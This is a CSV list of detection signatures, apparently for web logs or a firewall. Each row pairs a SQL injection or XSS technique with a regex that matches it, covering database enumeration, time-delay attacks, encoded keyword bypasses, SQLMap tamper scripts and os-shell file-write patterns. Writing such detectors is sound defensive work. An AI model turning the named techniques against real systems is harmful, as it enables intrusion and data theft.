attack_name,attack_query
[SQL INJECTION] SQL statement keywords detected,(SELECT|FROM(\+|%20)dual|INSERT|UPDATE|DROP|COLLATE|CASE|SUBSTR|SUBSTRING|NULL|ORDER(\+|%20)BY|UNION(\+|%20)(ALL)?).+(--(\+|%20)|%23)?
[SQL INJECTION] Database enumeration,v$version|v$instance|@@version|version\(\)|all_tables|all_tab_columns|information_schema.tables|information_schema.columns
[SQL INJECTION] Time delay attack,pg_sleep|sleep|dbms_pipe\.receive_message|WAITFOR(\+|%20)DELAY
[SQL INJECTION] Popular conditional error method detection,1\/0
[SQL INJECTION] Popular SQL Functions keywords detected,ASCII|CONCAT|CHAR|HEX
[SQL INJECTION] Bypass techniques (non-whitespace) detected,\/\*.*?\*\/|%0b
[SQL INJECTION] Single-encoded keywords detected,(%53%45%4C%45%43%54|%49%4E%53%45%52%54|%55%50%44%41%54%45|%44%45%4C%45%54%45|%43%4F%4C%4C%41%54%45|%43%41%53%45|%53%55%42%53%54%52|%53%55%42%53%54%52%49%4E%47|%4E%55%4C%4C|%4F%52%44%45%52%20%42%59|%55%4E%49%4F%4E|%55%4E%49%4F%4E%20%41%4C%4C|%46%52%4F%4D%20%64%75%61%6C)
[SQL INJECTION] Double-encoded keywords detected,(%2553%2545%254C%2545%2543%2554|%2549%254E%2553%2545%2552%2554|%2555%2550%2544%2541%2554%2545|%2544%2545%254C%2545%2554%2545|%2543%254F%254C%254C%2541%2554%2545|%2543%2541%2553%2545|%2553%2555%2542%2553%2554%2552|%2553%2555%2542%2553%2554%2552%2549%254E%2547|%254E%2555%254C%254C|%254F%2552%2544%2545%2552%2520%2542%2559|%2555%254E%2549%254F%254E|%2555%254E%2549%254F%254E%2520%2541%254C%254C|%2546%2552%254F%254D%2520%2564%2575%2561%256C)
[SQL INJECTION] Unicode-encoded keywords detected,(%u0053%u0045%u004C%u0045%u0043%u0054|%u0049%u004E%u0053%u0045%u0052%u0054|%u0055%u0050%u0044%u0041%u0054%u0045|%u0044%u0045%u004C%u0045%u0054%u0045|%u0043%u004F%u004C%u004C%u0041%u0054%u0045|%u0043%u0041%u0053%u0045|%u0053%u0055%u0042%u0053%u0054%u0052|%u0053%u0055%u0042%u0053%u0054%u0052%u0049%u004E%u0047|%u004E%u0055%u004C%u004C|%u004F%u0052%u0044%u0045%u0052%u0020%u0042%u0059|%u0055%u004E%u0049%u004F%u004E|%u0055%u004E%u0049%u004F%u004E%u0020%u0041%u004C%u004C|%u0046%u0052%u004F%u004D%u0020%u0064%u0075%u0061%u006C)
[SQL INJECTION] Char unicode escape (SQLMap tamper script) detected,(%5Cu0053%5Cu0045%5Cu004C%5Cu0045%5Cu0043%5Cu0054|%5Cu0049%5Cu004E%5Cu0053%5Cu0045%5Cu0052%5Cu0054|%5Cu0055%5Cu0050%5Cu0044%5Cu0041%5Cu0054%5Cu0045|%5Cu0044%5Cu0045%5Cu004C%5Cu0045%5Cu0054%5Cu0045|%5Cu0043%5Cu004F%5Cu004C%5Cu004C%5Cu0041%5Cu0054%5Cu0045|%5Cu0043%5Cu0041%5Cu0053%5Cu0045|%5Cu0053%5Cu0055%5Cu0042%5Cu0053%5Cu0054%5Cu0052|%5Cu0053%5Cu0055%5Cu0042%5Cu0053%5Cu0054%5Cu0052%5Cu0049%5Cu004E%5Cu0047|%5Cu004E%5Cu0055%5Cu004C%5Cu004C|%5Cu004F%5Cu0052%5Cu0044%5Cu0045%5Cu0052%5Cu0020%5Cu0042%5Cu0059|%5Cu0055%5Cu004E%5Cu0049%5Cu004F%5Cu004E|%5Cu0055%5Cu004E%5Cu0049%5Cu004F%5Cu004E%5Cu0020%5Cu0041%5Cu004C%5Cu004C|%5Cu0046%5Cu0052%5Cu004F%5Cu004D%5Cu0020%5Cu0064%5Cu0075%5Cu0061%5Cu006C)
[SQL INJECTION] Overlong UTF8 (SQLMap tamper script) detected,(%C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94|%C1%89%C1%8E%C1%93%C1%85%C1%92%C1%94|%C1%95%C1%90%C1%84%C1%81%C1%94%C1%85|%C1%84%C1%85%C1%8C%C1%85%C1%94%C1%85|%C1%83%C1%8F%C1%8C%C1%8C%C1%81%C1%94%C1%85|%C1%83%C1%81%C1%93%C1%85|%C1%93%C1%95%C1%82%C1%93%C1%94%C1%92|%C1%93%C1%95%C1%82%C1%93%C1%94%C1%92%C1%89%C1%8E%C1%87|%C1%8E%C1%95%C1%8C%C1%8C|%C1%8F%C1%92%C1%84%C1%85%C1%92%C0%A0%C1%82%C1%99|%C1%95%C1%8E%C1%89%C1%8F%C1%8E|%C1%95%C1%8E%C1%89%C1%8F%C1%8E%C0%A0%C1%81%C1%8C%C1%8C|%C1%86%C1%92%C1%8F%C1%8D%C0%A0%C1%A4%C1%B5%C1%A1%C1%AC)
[SQL INJECTION] SQLMap --os-shell signatures,(INTO%20OUTFILE|INTO%20DUMPFILE|LOAD_FILE)
[XSS] Testing for vuln,(javascript:)?alert\(
[XSS] Frequently seen tags,%3C(script|iframe|img%20src)
